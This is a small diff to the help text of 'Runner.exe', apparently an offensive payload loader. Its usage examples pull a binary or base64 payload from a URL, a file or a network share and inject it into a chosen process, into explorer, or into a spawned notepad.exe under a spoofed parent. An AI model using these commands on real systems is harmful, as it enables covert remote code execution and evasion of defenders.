@@ -12,8 +12,8 @@ Runner Help:
     Example: Runner.exe targ=http://fun/targ.bin form=bin meth=simple pid=1000
     Example: Runner.exe targ=C:\path\to\targ.b64 form=b64 meth=simple pid=self
     Example: Runner.exe targ=\\some\share\path\to\targ.b64 form=b64 meth=simple pid=explorer
-    Example: Runner.exe targ=https://fun/targ.bin form=b64 meth=simple parent=1000 spawn=C:\path\to\custom.exe
-    Example: Runner.exe targ=https://fun/targ.bin form=b64 meth=simple parent=explorer spawn=notepad.exe
+    Example: Runner.exe targ=https://fun/targ.bin parent=1000 spawn=C:\path\to\custom.exe
+    Example: Runner.exe targ=https://fun/targ.bin parent=explorer spawn=notepad.exe
 Defaults:
     meth => simple
     form => bin
